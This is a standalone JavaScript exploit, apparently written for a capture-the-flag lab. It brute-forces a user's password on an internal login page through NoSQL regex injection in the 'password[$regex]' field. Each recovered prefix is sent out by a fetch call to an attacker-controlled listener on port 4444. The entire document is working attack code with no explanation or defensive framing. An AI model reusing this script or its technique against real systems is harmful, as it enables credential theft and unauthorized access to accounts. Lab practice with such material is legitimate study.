async function callAuth(pass) {
	var content = await fetch("http://staff-review-panel.mailroom.htb/auth.php", {
		"headers": {
			"content-type": "application/x-www-form-urlencoded"
		},
		"body": "email=tristan@mailroom.htb&password[$regex]=^"+pass,
		"method": "POST"
	}).then(function (res) {
		return res.text();
	});
	return { d: pass, c: /"success":true/.test(content) }
}
function notify(pass) {
	fetch("http://<IP>:4444/"+pass, {});
}
var chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~";
function cal(chars, pass) {
	for (var i = 0; i < chars.length; i++) {
		callAuth(pass+chars[i]).then(function (item) {
			if (item.c) {
				notify(item.d);
				cal("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#%'()+, -/:;<=>@[\]_`{}~", item.d);
			}
		});
	}
}
cal(chars, "");